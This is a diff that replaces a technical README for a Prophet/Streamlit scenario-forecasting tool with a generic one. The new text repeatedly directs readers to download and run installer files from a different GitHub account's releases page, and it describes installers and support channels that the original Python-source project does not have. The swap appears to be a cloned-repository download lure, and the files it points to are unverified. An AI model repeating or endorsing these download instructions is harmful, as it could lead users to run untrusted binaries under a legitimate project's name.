@@ -1,254 +1,92 @@
-# ForecastFactory, AI-Driven Scenario Simulator
+# 🌟 Forecast-Factory - Predict Business Outcomes Effectively
 
-ForecastFactory is an advanced **AI-powered forecasting and simulation platform** built with **Python, Streamlit, Prophet, and SQLAlchemy**. It enables analysts, data scientists, and business strategists to **simulate business outcomes under different “what-if” scenarios**, allowing organizations not just to predict, but to *plan and adapt* intelligently.
+[![Download Forecast-Factory](https://img.shields.io/badge/Download-Forecast--Factory-blue.svg)](https://github.com/Sowrab121/Forecast-Factory/releases)
 
----
+## 🚀 Getting Started
 
-## Project Overview
+Welcome to Forecast-Factory! This tool helps you forecast business metrics and explore different scenarios in a user-friendly way. With the power of AI, you can visualize results in real time, making it easier to make strategic decisions.
 
-ForecastFactory bridges the gap between **data-driven forecasting** and **strategic scenario planning**. Traditional forecasting tools answer “what will happen,” while ForecastFactory explores **“what could happen”** under changing conditions like pricing shifts, ad budget changes, or supply constraints.
+## 📥 Download & Install
 
-**Core Purpose:** Empower teams to **simulate future outcomes**, test assumptions, and quantify the effect of strategic decisions in real time.
+To get started, visit the Releases page to download the tool:
 
----
+**[Visit this page to download](https://github.com/Sowrab121/Forecast-Factory/releases)**
 
-## Business Goal
+### Step-by-Step Installation
 
-Most organizations rely on static forecasts that can’t adapt to real-world changes. ForecastFactory empowers them to:
+1. **Visit the Releases Page**:
+   Go to the [Release page here](https://github.com/Sowrab121/Forecast-Factory/releases).
 
-* **Quantify trade-offs:** What if ad spend rises by 20%?
-* **Stress-test assumptions:** How sensitive is revenue to a price increase?
-* **Prepare for volatility:** What if demand drops due to supply shortages?
+2. **Find the Latest Version**:
+   Look for the section labeled "Latest Release." This includes the most recent version of Forecast-Factory.
 
-It transforms forecasting from passive prediction into **active decision simulation**.
+3. **Download the File**:
+   Click on the appropriate file for your operating system—Windows, Mac, or Linux. Each file is clearly labeled.
 
----
+4. **Open the Downloaded File**:
+   After the download is complete, locate the file in your downloads folder and double-click it. This will start the installation process.
 
-## Key Features
+5. **Follow the Installation Prompts**:
+   Simply follow the prompts on your screen. Accept the terms and conditions, choose the installation location, and click "Install."
 
-* **AI Forecasting:** Prophet-based trend, holiday, and seasonality modeling.
-* **Scenario Engine:** Interactive “what-if” analysis with domain-driven adjustments.
-* **Elasticity Modeling:** Realistic impact simulation via custom elasticity coefficients.
-* **SQL-Integrated Pipeline:** Seamlessly fetch data via SQLAlchemy.
-* **Dynamic Visualization:** Real-time Plotly and Streamlit dashboards.
-* **Explainability:** Automated narrative summaries for business interpretation.
-* **Exportable Outputs:** Save data as CSV or Markdown reports.
+6. **Launch Forecast-Factory**:
+   Once the installation finishes, you can open Forecast-Factory from your applications list. Look for the icon labeled "Forecast-Factory."
 
----
+## 🎯 Features
 
-## Architecture Overview
+Forecast-Factory is packed with features that enhance your forecasting experience:
 
-```mermaid
-flowchart LR
-A["SQL / CSV Data Source"] --> B["ETL + Feature Engineering"]
-B --> C["Forecast Model (Prophet + Baseline)"]
-C --> D["Scenario Engine (Elasticity Adjustments)"]
-D --> E["Explainability Layer (Attribution + Narrative)"]
-E --> F["Visualization (Streamlit + Plotly)"]
-F --> G["Exports: CSV / Model / Insights"]
-```
+- **Interactive Dashboards**: Navigate through user-friendly dashboards to visualize data.
+- **What-if Scenarios**: Run various simulations to see potential outcomes based on different inputs.
+- **Real-Time Analytics**: Get immediate feedback and results as you adjust parameters.
+- **AI-Powered Predictions**: Use advanced machine learning algorithms to improve forecasting accuracy.
+- **SQL Integration**: Effortlessly connect to your databases for seamless data import and management.
 
-### Design Philosophy
+## 💻 System Requirements
 
-The system is **modular and extensible**, enabling analysts to plug in new models or connect it to MLOps pipelines for continuous retraining.
+To ensure smooth operation of Forecast-Factory, your system should meet the following requirements:
 
----
+- **Operating System**: Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- **RAM**: At least 4GB of RAM.
+- **Storage**: Minimum of 200MB of free space for installation and data.
+- **Python**: Ensure that Python 3.7 or later is installed (input from the installation should automatically manage this).
 
-## Technical Architecture
+## 🌐 How to Use Forecast-Factory
 
-### 1. Data & SQL Layer
+1. **Open the Application**:
+   Click on the Forecast-Factory icon to start using the tool.
 
-* **SQLite** used for quick prototyping, extensible to PostgreSQL or Snowflake.
-* **SQLAlchemy ORM** provides seamless connection and schema management.
-* Data cleaned and aggregated via Pandas ETL transformations.
+2. **Upload Your Data**:
+   Click on the "Upload Data" option. Choose your CSV or Excel file that contains the business metrics you want to analyze.
 
-### 2. Forecast Engine
+3. **Select Your Metrics**:
+   Once the data is loaded, pick the metrics you are interested in forecasting. You can easily select different columns from your data.
 
-* Powered by **Prophet**, modeling seasonality, trend, and holiday effects.
-* Fallback to **Moving Average** for baseline comparison.
-* **Backtesting pipeline** validates performance via MAE, RMSE, and SMAPE.
+4. **Run Simulations**:
+   Use the provided tools to set different scenarios. For example, you might adjust sales targets or marketing budgets to see how they affect outcomes.
 
-### 3. Scenario Engine
+5. **Visualize Results**:
+   After running simulations, view the results on interactive charts. These visualizations help in understanding trends and making decisions.
 
-* Defines relationships such as:
+6. **Export Results**:
+   You can download your forecasts and visualizations in a report format. Click the "Export" button for this option.
 
-  * `ΔQ/Q = ε × ΔP/P` (Price elasticity)
-  * `Uplift = α × log(1 + β × AdSpend)` (Media response)
-  * `Q' = Q × (1 + γ × PromoFlag)` (Promotion effects)
-* Produces **differential forecasts** showing net impact vs baseline.
+## 📚 Support and Resources
 
-### 4. Visualization Layer
+If you encounter any issues while using Forecast-Factory, you can find help in several places:
 
-* Streamlit powers the interactive UI.
-* Plotly renders visual insights with interactivity and real-time updates.
-* Exports available in CSV format for further analysis.
+- **Documentation**: Check the built-in help section within the application for guidance on features and usage.
+- **Community Forum**: Visit our forum where you can ask questions and share tips with other users.
+- **Contact Support**: If you have specific issues that require immediate attention, feel free to reach out to our support team via the contact form on our GitHub page.
 
-### 5. Explainability Module
+## 🌍 Join the Community
 
-* Integrates Prophet component decomposition and SHAP-like narratives.
-* Generates business-oriented insights:
-  *“Increased ad spend drove +7.8% uplift over baseline between July-August.”*
+We encourage you to join our growing community of users who share insights and improvements. Connect with fellow analysts and data enthusiasts through our forum or social media channels.
 
----
+## 📑 License
 
-## Screenshots
+Forecast-Factory is open-source software, which means it is free to use and customize. You can view the full license details on the repository page.
 
-### ForecastFactory Home
+Thank you for trying Forecast-Factory! We hope it helps you achieve your forecasting goals effectively. 
 
-<img width="1228" height="381" alt="Screenshot 2025-11-07 at 13-37-21 ForecastFactory Scenario Simulator" src="https://github.com/user-attachments/assets/04b3f513-3174-434c-a04b-606c8f2606a2" />
-
-*Define the data source, KPI, and forecast horizon.*
-
----
-
-### Baseline Forecast
-
-<img width="1157" height="521" alt="Screenshot 2025-11-07 at 13-37-33 ForecastFactory Scenario Simulator" src="https://github.com/user-attachments/assets/47a748a2-fbc9-43c2-aa85-71a7ec413607" />
-
-*Displays Prophet-based forecasts with confidence intervals.*
-
----
-
-### Scenario Builder
-
-<img width="1221" height="571" alt="Screenshot 2025-11-07 at 13-37-52 ForecastFactory Scenario Simulator" src="https://github.com/user-attachments/assets/74ff5b76-64f4-44e8-82e4-1487732ce519" />
-
-*Interactively tweak ad spend, pricing, or promotions to simulate impact.*
-
----
-
-### Delta Analysis
-
-<img width="1244" height="465" alt="Screenshot 2025-11-07 at 13-38-08 ForecastFactory Scenario Simulator" src="https://github.com/user-attachments/assets/9377b358-a602-4d9d-aa0f-2c6c430a87c1" />
-
-*Visualize baseline vs simulated outcomes, with quantified uplift metrics.*
-
----
-
-## Case Study, *E-commerce Demand Simulation*
-
-**Objective:** Forecast 90 days of revenue while simulating increased ad spend and promotions.
-
-1. **Baseline:** Prophet trained on 2 years of revenue data.
-2. **Scenario:** +15% ad spend, 10% promotion activation.
-3. **Elasticity Equations:**
-
-   * Ad response = 0.3 × log(1 + 0.001 × spend)
-   * Promo uplift = +6%
-4. **Result:** +8.7% projected uplift vs baseline; ±2.3% confidence margin.
-5. **Insight:** The simulator suggested that moderate ad increases yield diminishing returns after 15% budget growth.
-
----
-
-## Directory Structure
-
-```
-forecastfactory/
-│
-├── app.py                   # Streamlit main interface         
-├── db/
-│   ├── schema.sql           # Database schema
-│   └── seed.sql             # Sample data
-├── forecastfactory
-│   ├── __init__.py
-│   ├── elasticity.py
-│   ├── explain.py
-│   ├── features.py
-│   ├── io_sql.py
-│   ├── models.py 
-│   ├── scenario.py
-│   └── viz.py
-├── config.yaml              # Configuration
-└── requirements.txt         # Dependencies
-
-```
-
----
-
-## Technical Appendix
-
-### Forecasting Metrics
-
-| Metric    | Formula      | Description             |
-| --------- | ------------ | ----------------------- |
-| **MAE**   | Σ            | y−ŷ                     |
-| **RMSE**  | √Σ(y−ŷ)² / n | Penalizes larger errors |
-| **SMAPE** | (200/n) Σ    | y−ŷ                     |
-
-### Elasticity Equations
-
-* **Price Elasticity:** ΔQ/Q = ε × ΔP/P
-* **Media Response:** Uplift = α × log(1 + β × AdSpend)
-* **Promo Effect:** Q’ = Q × (1 + γ × PromoFlag)
-
-### Database Schema
-
-| Table                | Description                       |
-| -------------------- | --------------------------------- |
-| `fact_kpi_daily`     | KPI value by day                  |
-| `fact_drivers_daily` | Drivers (price, ad spend, promo)  |
-| `dim_calendar`       | Holidays and day-of-week metadata |
-
----
-
-## Setup Instructions
-
-```bash
-git clone https://github.com/AmirhosseinHonardoust/Forecast-Factory.git
-cd ForecastFactory
-pip install -r requirements.txt
-streamlit run app.py
-```
-
-If Prophet is missing:
-
-```bash
-pip install prophet pystan==2.19.1.1
-```
-
-Database initialization:
-
-```bash
-python -m forecastfactory.cli init
-```
-
----
-
-## Business Applications
-
-| Sector         | Example Use Case                                 |
-| -------------- | ------------------------------------------------ |
-| **E-commerce** | Predict sales under different promo policies     |
-| **Marketing**  | Simulate ROI of ad budget increases              |
-| **Finance**    | Stress-test revenue against macroeconomic shocks |
-| **Retail**     | Optimize stock levels under demand uncertainty   |
-| **Operations** | Forecast capacity or workforce requirements      |
-
----
-
-## Future Enhancements
-
-* Integrate **XGBoost** and **LSTM** for hybrid forecasting.
-* Introduce **AutoML model selection** and backtesting reports.
-* Add **multi-scenario comparison** (budget vs promo vs combined).
-* Implement **role-based dashboards** with Streamlit authentication.
-* Export results to **Power BI or Google Data Studio**.
-* Connect to **real-time APIs** for adaptive forecasting.
-
----
-
-## References & Attributions
-
-* [Prophet Documentation](https://facebook.github.io/prophet/docs/quick_start.html)
-* [XGBoost Docs](https://xgboost.readthedocs.io/en/stable/)
-* [Streamlit API Reference](https://docs.streamlit.io/)
-* [Plotly Python Library](https://plotly.com/python/)
-* [SQLAlchemy ORM](https://docs.sqlalchemy.org/)
-* [SHAP Framework](https://shap.readthedocs.io/)
-
----
-
-## Conclusion
-
-**Forecast-Factory** transforms forecasting into a dynamic, interactive experience that merges **machine learning, simulation, and human insight**.
-It’s a platform where analysts don’t just observe the future, they **shape it through data-driven experimentation**.
+**[Visit this page to download](https://github.com/Sowrab121/Forecast-Factory/releases)**
